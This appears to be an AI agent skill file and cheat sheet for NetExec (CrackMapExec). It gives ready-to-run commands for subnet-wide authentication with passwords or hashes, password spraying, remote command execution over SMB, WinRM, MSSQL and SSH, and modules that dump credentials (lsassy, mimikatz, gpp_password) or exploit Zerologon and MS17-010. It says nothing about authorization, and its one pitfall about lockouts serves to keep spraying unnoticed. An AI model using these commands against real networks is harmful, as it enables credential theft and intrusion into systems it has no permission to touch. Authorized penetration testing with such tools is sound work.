---
name: nxc-cme
description: "NetExec / CrackMapExec usage: SMB, WinRM, LDAP, MSSQL modules for enumeration, spraying, and execution. Use this skill when you need one tool across many hosts."
---

# NetExec (nxc)

## Overview

nxc (formerly CrackMapExec) is a swiss-army knife for Windows networks: authenticate to many hosts at once, enumerate, and execute.

## Basic

```bash
nxc smb 10.0.0.0/24 -u user -p pass
nxc smb 10.0.0.0/24 -u user -H <hash>
nxc smb hosts.txt -u users.txt -p passwords.txt --continue-on-success
```

## Enumeration

```bash
nxc smb 10.0.0.0/24 -u user -p pass --shares
nxc smb 10.0.0.0/24 -u user -p pass --sessions
nxc smb 10.0.0.0/24 -u user -p pass --loggedon-users
nxc smb 10.0.0.0/24 -u user -p pass --users --groups
nxc smb 10.0.0.0/24 -u user -p pass --pass-pol
nxc ldap DC -u user -p pass --users --groups --admin-count
```

## Execution

```bash
nxc smb host -u user -p pass -x "whoami"
nxc smb host -u user -p pass -X '$PSVersionTable'
nxc winrm host -u user -p pass -x "ipconfig"
nxc mssql host -u user -p pass -q "select @@version"
nxc ssh host -u user -p pass -x "id"    # Linux
```

## Modules

```bash
nxc smb host -u user -p pass -M lsassy
nxc ldap DC -u user -p pass -M gpp_password
nxc smb host -u user -p pass -M mimikatz
nxc smb 10.0.0.0/24 -u user -p pass -M zerologon
nxc smb 10.0.0.0/24 -u '' -p '' -M ms17-010
nxc ldap DC -u user -p pass -M maq          # machine account quota
nxc ldap DC -u user -p pass -M adcs
```

## Spraying

```bash
nxc smb DC -u users.txt -p 'Spring2026!' --continue-on-success
nxc ldap DC -u users.txt -p 'Spring2026!' --continue-on-success
```

Add `--no-bruteforce` to pair users with passwords one-to-one.

## Relay lists

```bash
nxc smb 10.0.0.0/24 --gen-relay-list relay.txt
```

## Database

```bash
nxc smb 10.0.0.0/24 -u user -p pass --db nxc.db
nxc --workspace import
```

## Pitfalls

- Spraying trips lockout policies; check `--pass-pol` first.
- `-x` requires local admin (or WinRM rights for winrm).
- Output is noisy — pipe to `grep` for the success markers.

## Verification

A successful auth must be confirmable by a follow-up command on the same host.
